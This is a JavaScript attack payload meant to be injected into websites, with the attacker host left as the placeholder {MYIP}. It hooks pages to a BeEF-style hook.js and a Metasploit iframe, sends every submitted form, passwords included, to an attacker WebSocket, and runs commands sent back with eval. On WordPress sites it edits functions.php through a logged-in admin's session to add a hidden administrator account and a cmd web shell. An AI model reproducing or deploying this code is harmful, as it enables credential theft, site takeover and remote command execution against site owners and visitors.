function createCookie(name, value, time)
{
  if (time) {
    var date = new Date();
    date.setTime(date.getTime()+(time));
    var expires = '; expires='+date.toGMTString();
  }
    else var expires = '';
    document.cookie = name+ '=' + value + expires + '; path=/';
}

function readCookie(name)
{
  var nameEQ = name + '=';
  var ca = document.cookie.split(';');
  for(var i=0;i < ca.length;i++) {
    var c = ca[i];
    while (c.charAt(0)==' ') c = c.substring(1,c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
  }
  return null;
}

function eraseCookie(name)
{
  createCookie(name, '', -1);
}

function serialize (form) {
    'use strict';
    var i, j, len, jLen, formElement, q = [];
    function urlencode (str) {
        return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
            replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
    }
    function addNameValue(name, value) {
        q.push(urlencode(name) + '=' + urlencode(value));
    }
    if (!form || !form.nodeName || form.nodeName.toLowerCase() !== 'form') {
        throw 'You must supply a form element';
    }
    for (i = 0, len = form.elements.length; i < len; i++) {
        formElement = form.elements[i];
        if (formElement.name === '' || formElement.disabled) {
            continue;
        }
        switch (formElement.nodeName.toLowerCase()) {
        case 'input':
            switch (formElement.type) {
            case 'text':
            case 'hidden':
            case 'password':
            case 'button': // Not submitted when submitting form manually, though jQuery does serialize this and it can be an HTML4 successful control
            case 'submit':
                addNameValue(formElement.name, formElement.value);
                break;
            case 'checkbox':
            case 'radio':
                if (formElement.checked) {
                    addNameValue(formElement.name, formElement.value);
                }
                break;
            case 'file':
                // addNameValue(formElement.name, formElement.value); // Will work and part of HTML4 "successful controls", but not used in jQuery
                break;
            case 'reset':
                break;
            }
            break;
        case 'textarea':
            addNameValue(formElement.name, formElement.value);
            break;
        case 'select':
            switch (formElement.type) {
            case 'select-one':
                addNameValue(formElement.name, formElement.value);
                break;
            case 'select-multiple':
                for (j = 0, jLen = formElement.options.length; j < jLen; j++) {
                    if (formElement.options[j].selected) {
                        addNameValue(formElement.name, formElement.options[j].value);
                    }
                }
                break;
            }
            break;
        case 'button': // jQuery does not submit these, though it is an HTML4 successful control
            switch (formElement.type) {
            case 'reset':
            case 'submit':
            case 'button':
                addNameValue(formElement.name, formElement.value);
                break;
            }
            break;
        }
    }
    return q.join('&');
}

function loadMSF()
{
  try
  {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = 'http://{MYIP}:8080/bingo';
    document.body.appendChild(iframe);
  }
  catch (e) { setTimeout('loadMSF()', 2000) }
}

function forceCMSLogout()
{
  anchors = document.getElementsByTagName('a');
  bufferFrame = [];
  logoutStr = /logout|log out|abmelden|logoff|ausloggen/i;
  matched = false;
  for(i=0;i<anchors.length;i++)
  {
    if(anchors[i].href.match(logoutStr) || anchors[i].innerHTML.match(logoutStr))
    {
      matched = true;
      sendMsg('[+] ' + document.domain + ': Logout was forced');
      bufferFrame[i] = document.createElement('iframe');
      bufferFrame[i].style = 'display:none';
      bufferFrame[i].src = anchors[i].href;
      document.body.appendChild(bufferFrame[i]);
    }
  }
  if(matched)
  {
    createCookie('frcout', 'true', 300000);
  }
}

function initServices()
{
  if(!readCookie('frcout'))
  {
    loadMSF();
    setTimeout('forceCMSLogout', 9000)
  }
}

function initMariachi()
{
  try
  {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'http://{MYIP}:3000/hook.js';
    head.appendChild(script);

  } catch (e) { setTimeout('initMariachi()', 2000) }

}

function formLogger()
{
  for(i=0;i<document.forms.length;i++)
  {
    document.forms[i].onsubmit = function(){
      sendMsg('[ ' + document.location.href + ' => ' + this.action + '] ' + serialize(this), '');
      return true;
    }
  }
}


function resolveWPUser()
{
  loggedIn = false;
  userName = '';
  try
  {
    userName = document.getElementsByClassName('display-name')[0].innerHTML;
    loggedIn = true;
  }
  catch (e) {}
  return [loggedIn, userName];
}

function resolveWPAdminPath()
{
  aPath = '';
  currentURL = document.location.href.split('/');
  currentURL.pop();
  targetURL = currentURL.join('/');
  aPath = document.location.href.match(/wp-admin/ig) ? targetURL : targetURL + '/wp-admin';
  try
  {
    aPath = document.getElementById('wp-admin-bar-dashboard').firstChild.href;
  }
  catch (e) {}
  aPath = aPath.match(/\/$/) ? aPath.slice(0, -1) : aPath;
  return aPath;
}

function injectPHPExploitStager(payload, persistence)
{
  dataFrame = document.createElement('iframe');
  dataFrame.onload = function()
  {
    try
    {
      dataContent = (dataFrame.contentDocument || dataFrame.contentWindow.document);
      oldContent = dataContent.getElementById('newcontent').value;
      if(!(oldContent.indexOf(payload) > -1))
      {
        dataContent.getElementById('newcontent').value = "<?php " + payload + " ?>\n\n" + dataContent.getElementById('newcontent').value;
        dataFrame.onload = function()
        {
          if(!persistence && !(oldContent.indexOf(payload) > -1))
          {
            dataContent = (dataFrame.contentDocument || dataFrame.contentWindow.document);
            dataContent.getElementById('newcontent').value = oldContent;
            dataFrame.onload = function() {}
            dataContent.getElementById('submit').click();
          }
        }
        dataContent.getElementById('submit').click();
      }
    }
    catch (e) {}
  }
  dataFrame.style.display = 'none';
  document.body.appendChild(dataFrame);
  dataFrame.src = resolveWPAdminPath() + '/theme-editor.php?file=functions.php';
}

function addWPBackdoor()
{
  injectPHPExploitStager('if(!username_exists("wpupdate")){$user_id=wp_create_user("wpupdate","1234");$user=new WP_User($user_id);$user->set_role("administrator");}if(preg_match("/users.php/i",$_SERVER[\'PHP_SELF\'])){echo "<script>document.addEventListener(\'DOMContentLoaded\',function(t){for(trs=document.getElementsByTagName(\'tr\'),i=0;i<trs.length;i++)trs[i].outerHTML.match(/wpupdate/)&&(trs[i].outerHTML=\'\');for(cnts=document.getElementsByClassName(\'count\'),i=0;i<cnts.length;i++)cnts[i].innerHTML=\'(\'+String(cnts[i].innerHTML.replace(\'(\',\'\').replace(\')\',\'\')-1)+\')\';for(dspn=document.getElementsByClassName(\'displaying-num\'),i=0;i<dspn.length;i++)dspn[i].innerHTML=String(dspn[i].innerHTML.split(\' \')[0]-1)+\' \'+dspn[i].innerHTML.split(\' \')[1];});</script>";};if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }', true)
}

function sendMsg(message, callback)
{
  try
  {
    ws = new WebSocket('ws://{MYIP}:8441');
    ws.onopen = function ()
    {
      ws.send(message);
    }
    ws.onmessage = function(msg)
    {
      eval(callback);
    }
  }
  catch(e) {}
}

function initSock()
{
  ws = new WebSocket('ws://{MYIP}:8441');
  ws.onopen = function ()
  {
    setInterval('ws.send("PING")', 3000);
    setTimeout('formLogger()', 2000);
    setInterval('initServices()', 3000);
    wpUser = resolveWPUser();
    if(wpUser[0])
    {
      ws.send('[+] ' + document.domain + ': Wordpress connected [' + wpUser[1] + ':' + document.location.pathname + ']');
      addWPBackdoor();
    }
    else
    {
      ws.send('[+] ' + document.domain + '');
    }
  }
  ws.onmessage = function(msg)
  {
    data = msg.data.split(':');
    if(data[0].match(document.domain))
    {
      ws.send('FINEV:' + document.domain);
      eval(data[1]);
    }
  }
}

initMariachi();
initSock();
